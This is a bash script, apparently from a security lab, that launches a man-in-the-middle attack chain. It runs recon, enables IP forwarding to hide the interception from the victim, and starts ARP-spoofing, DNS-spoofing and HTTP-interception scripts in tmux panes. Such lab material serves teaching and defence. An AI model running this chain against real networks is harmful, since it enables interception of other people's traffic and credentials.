#!/usr/bin/env bash
# scripts/run-attacker.sh
# Recon, then start arp_spoof + dns_spoof + http_mitm in a tmux session.
# Usage:  sudo ./scripts/run-attacker.sh
#
# Requires root (raw sockets) and net.ipv4.ip_forward=1.
set -euo pipefail

if [[ $EUID -ne 0 ]]; then
    echo "Run with sudo (raw sockets require root)." >&2
    exit 1
fi

# Make sure forwarding is on; otherwise the victim notices a black hole.
sysctl -w net.ipv4.ip_forward=1 >/dev/null

SESSION="aco03-attacker"
ROOT="$(cd "$(dirname "$0")/.." && pwd)"

echo "=== Recon ==="
python3 "$ROOT/attacker/recon.py"
echo
read -rp "Recon looks good? Press Enter to launch the attack chain... "

tmux kill-session -t "$SESSION" 2>/dev/null || true

# pane 0: arp_spoof (will auto-heal on exit)
tmux new-session  -d -s "$SESSION" -n attacker \
    "cd '$ROOT' && python3 attacker/arp_spoof.py; exec bash"

# pane 1: dns_spoof
tmux split-window -h -t "$SESSION" \
    "cd '$ROOT' && python3 attacker/dns_spoof.py; exec bash"

# pane 2: http_mitm
tmux split-window -v -t "$SESSION" \
    "cd '$ROOT' && python3 attacker/http_mitm.py; exec bash"

tmux select-layout -t "$SESSION" tiled
echo "Attach with:  tmux attach -t $SESSION"
echo "Cleanup when done:  python3 $ROOT/attacker/cleanup.py"
